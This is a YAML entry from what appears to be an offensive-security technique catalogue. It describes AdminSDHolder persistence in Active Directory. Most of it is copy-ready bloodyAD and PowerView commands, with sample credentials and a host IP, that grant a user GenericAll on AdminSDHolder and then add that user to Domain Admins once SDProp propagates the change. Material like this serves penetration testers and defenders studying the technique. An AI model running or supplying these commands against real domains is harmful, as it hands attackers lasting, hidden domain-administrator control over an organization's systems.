---
description: |
  AdminSDHolder persistence — modify the ACL on AdminSDHolder to gain permanent access to all protected groups (Domain Admins, Enterprise Admins, etc.). SDProp propagates these ACLs every 60 minutes.
commands:
  - have: Credentials
    cmd: |
      # AdminSDHolder propagates ACLs to all protected groups every 60 min
      # Add GenericAll on AdminSDHolder — get permanent access to Domain Admins, etc.

      # Add ACE to AdminSDHolder with bloodyAD
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll 'CN=AdminSDHolder,CN=System,DC=senshu,DC=sh' sec_user

      # Add ACE to AdminSDHolder with PowerView
      Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=senshu,DC=sh" -PrincipalIdentity sec_user -Rights All

      # Wait up to 60 minutes for SDProp to propagate
      # Then you have GenericAll on all protected groups (Domain Admins, Enterprise Admins, etc.)

      # Verify by adding yourself to Domain Admins
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add groupMember "Domain Admins" sec_user
phase:
  - Persistence
target_os:
  - Windows
services:
  - Active_Directory
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html
  - https://github.com/CravateRouge/bloodyAD
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
---
